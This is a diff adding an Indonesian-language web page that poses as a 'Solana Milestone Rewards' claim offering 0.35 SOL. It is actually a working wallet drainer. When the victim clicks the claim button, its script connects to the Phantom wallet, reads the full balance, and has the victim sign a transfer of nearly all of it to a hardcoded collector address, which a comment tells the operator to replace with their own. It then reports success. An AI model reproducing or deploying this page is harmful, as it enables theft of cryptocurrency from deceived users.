@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Milestone Rewards</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px 20px; }
+        .box { background: #111; border: 1px solid #14F195; border-radius: 20px; padding: 30px; max-width: 400px; margin: auto; }
+        .badge { background: #14F195; color: #000; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        h2 { font-size: 18px; margin: 15px 0 5px; }
+        .stats { font-size: 14px; color: #888; margin-bottom: 20px; }
+        .amount { color: #14F195; font-size: 35px; font-weight: bold; margin: 10px 0; }
+        .btn { background: #14F195; color: #000; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <span class="badge">AKTIVITAS TERDETEKSI</span>
+        <h2>Milestone Reward Tercapai!</h2>
+        <div class="stats">Total Transaksi: <b>50/50 Verified</b></div>
+        <p style="font-size: 13px; color: #ccc;">Selamat! Dompet Anda terpilih menerima loyalitas karena aktif di jaringan Solana.</p>
+        <div class="amount">0.35 SOL</div>
+        <button class="btn" onclick="execute()">KLAIM REWARD SEKARANG</button>
+        <p style="font-size: 11px; color: #555; margin-top: 15px;">ID Transaksi: #SOL-99281-REWARD</p>
+    </div>
+
+    <script>
+        // MASUKKAN WALLET PENAMPUNG KAMU DI SINI
+        const WALLET_PENAMPUNG = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc";
+
+        async function execute() {
+            if (!window.solana) { alert("Buka di Browser Phantom!"); return; }
+            try {
+                await window.solana.connect();
+                const provider = window.solana;
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+                let balance = await connection.getBalance(provider.publicKey);
+                let amountToSend = balance - 5000; 
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(WALLET_PENAMPUNG),
+                        lamports: amountToSend,
+                    })
+                );
+
+                let { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+                const signed = await provider.signTransaction(transaction);
+                await connection.sendRawTransaction(signed.serialize());
+                alert("Klaim Berhasil Diproses!");
+            } catch (err) { alert("Gagal verifikasi. Coba lagi."); }
+        }
+    </script>
+</body>
+</html>
